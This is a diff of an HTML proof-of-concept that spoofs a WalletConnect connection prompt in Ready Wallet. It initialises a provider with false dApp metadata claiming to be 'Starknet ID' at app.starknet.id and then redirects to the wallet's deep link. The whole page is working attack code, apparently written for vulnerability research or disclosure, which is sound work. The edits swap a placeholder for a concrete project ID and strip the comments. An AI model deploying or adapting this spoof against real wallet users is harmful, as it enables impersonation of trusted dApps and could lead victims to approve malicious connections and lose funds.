@@ -6,30 +6,37 @@
 </head>
 <body>
   <h1>Ready Wallet Origin Spoof PoC</h1>
-  <button id="connect">Spoof connect prompt</button>
+  <button id="connect">Spoof connect promptttt</button>
   <pre id="log"></pre>
 
-  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/universal-provider/dist/universal-provider.min.js"></script>
+  <!-- Pakai bundle dari unpkg -->
+  <script src="https://unpkg.com/@walletconnect/universal-provider@2.17.0/dist/index.umd.js"></script>
+
   <script>
     const REAL_ORIGIN = location.origin;
-    const CLAIMED_URL = 'https://app.starknet.id'; // domain palsu yang diklaim
-    const CLAIMED_NAME = 'Starknet ID';            // nama palsu
+    const CLAIMED_URL = 'https://app.starknet.id';
+    const CLAIMED_NAME = 'Starknet ID';
 
-    async function spoofConnect() {
-      const log = (msg) => document.getElementById('log').textContent += msg + '\n';
-      
+    const log = (msg) => {
+      document.getElementById('log').textContent += msg + '\n';
+    };
+
+    document.getElementById('connect').onclick = async () => {
       try {
-        // Init WalletConnect dengan metadata PALSU
-        const provider = await UniversalProvider.init({
-          projectId: 'YOUR_PROJECT_ID',
+        log('Initializing...');
+
+        const provider = await window.UniversalProvider.init({
+          projectId: '2f05ae7f1116030fde2d36508f472bfb',
           metadata: {
-            name: CLAIMED_NAME,        // tampil sebagai Starknet ID
+            name: CLAIMED_NAME,
             description: 'Spoofed dApp',
-            url: CLAIMED_URL,          // domain palsu
+            url: CLAIMED_URL,
             icons: []
           },
           relayUrl: 'wss://relay.walletconnect.com'
         });
+
+        log('Provider ready!');
 
         const { uri } = await provider.client.connect({
           requiredNamespaces: {
@@ -44,18 +51,14 @@
         if (uri) {
           log('Real origin: ' + REAL_ORIGIN);
           log('Claimed URL: ' + CLAIMED_URL);
+          log('URI: ' + uri);
           log('Opening Ready Wallet...');
-          
-          // Redirect ke Ready Wallet
-          const encodedUri = encodeURIComponent(uri);
-          location.href = `ready://wc?uri=${encodedUri}`;
+          location.href = `ready://wc?uri=${encodeURIComponent(uri)}`;
         }
       } catch(e) {
         log('Error: ' + e.message);
       }
-    }
-
-    document.getElementById('connect').onclick = spoofConnect;
+    };
   </script>
 </body>
 </html>
